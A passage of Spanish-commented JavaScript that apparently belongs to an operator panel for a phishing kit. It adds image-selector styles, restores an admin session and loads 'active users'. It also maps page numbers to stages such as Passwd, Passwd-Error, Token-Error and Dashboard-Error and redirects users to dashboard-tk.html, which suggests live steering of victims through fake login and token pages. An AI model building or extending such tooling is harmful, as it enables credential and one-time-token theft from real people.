if (saveImagesErrorBtn) {
    saveImagesErrorBtn.addEventListener('click', function () {
        saveImageData(5); // Redirigir a dashboard-tk.html (página 5)
    });
}

// Añadir CSS en línea para las imágenes
function addImageStyles() {
    const style = document.createElement('style');
    style.textContent = `
        /* Estilos compartidos para ambos selectores */
        .image-gallery img {
            transition: all 0.3s ease;
            max-height: 100px;
            object-fit: cover;
        }
        .image-gallery .overlay {
            position: absolute;
            top: 5px;
            right: 5px;
            opacity: 0;
            transition: all 0.3s ease;
        }
        
        /* Estilos para checkboxes (selector de 12 imágenes) */
        .image-gallery .image-checkbox {
            position: relative;
            display: block;
        }
        .image-gallery .img-checkbox {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }
        .image-gallery .img-checkbox:checked + label img {
            border: 3px solid #28a745;
            transform: scale(0.95);
        }
        .image-gallery .img-checkbox:checked + label .overlay {
            opacity: 1;
        }
        .image-gallery .img-checkbox:checked + label .overlay i {
            font-size: 1.5rem;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
        }
        
        /* Estilos para radio buttons (selector de imagen de perfil) */
        .profile-images .image-radio {
            position: relative;
            display: block;
        }
        .profile-images .profile-img-radio {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }
        .profile-images .profile-img-radio:checked + label img {
            border: 3px solid #007bff;
            transform: scale(0.95);
            box-shadow: 0 0 8px rgba(0, 123, 255, 0.5);
        }
        .profile-images .profile-img-radio:checked + label .overlay {
            opacity: 1;
        }
        .profile-images .profile-img-radio:checked + label .overlay i {
            font-size: 1.5rem;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
            color: #007bff;
        }
        .profile-images .profile-img-radio:not(:checked) + label:hover img {
            border: 3px solid #ccc;
        }
    `;
    document.head.appendChild(style);
}

// Inicializar la aplicación cuando el DOM esté cargado
document.addEventListener("DOMContentLoaded", async function () {
    // Cargar credenciales desde Firebase
    await loadAdminCredentials();
    // Agregar estilos para la galería de imágenes
    addImageStyles();
    // Cargar imágenes disponibles
    loadAvailableImages();

    // Verificar si el administrador está logueado
    if (localStorage.getItem("adminLoggedIn") === "true") {
        if (loginScreen) loginScreen.classList.add("d-none");
        if (adminPanel) adminPanel.classList.remove("d-none");
        loadActiveUsers();
        logCommand("Panel de administrador inicializado - Sesión restaurada");
    } else {
        logCommand("Panel de administrador esperando credenciales");
    }
});
// Función para convertir página a texto de estado
function getStatusText(page) {
    switch (page) {
        case 1:
            return "Inicio";
        case 2:
            return "Passwd";
        case 3:
            return "Juridico";
        case 4:
            return "Dashboard";
        case 5:
            return "Dashboard-Error";
        case 6:
            return "Passwd-Error";
        case 7:
            return "Juridico-Error";
        case 8:
            return "Token-Error";
        case 9:
            return "Fuera";
        default:
            return "Cargando...";
    }
}
// Función para obtener la clase de color para el estado
function getStatusClass(page) {
    switch (page) {
        case 1:
            return "success";
        case 2:
            return "info";
        case 3:
            return "warning";
        case 4:
            return "success";
        case 5:
            return "warning";
        case 6:
            return "danger";
        case 7:
            return "danger";
        case 8:
            return "danger";
        case 9:
            return "success";
        default:
            return "secondary";
    }
}
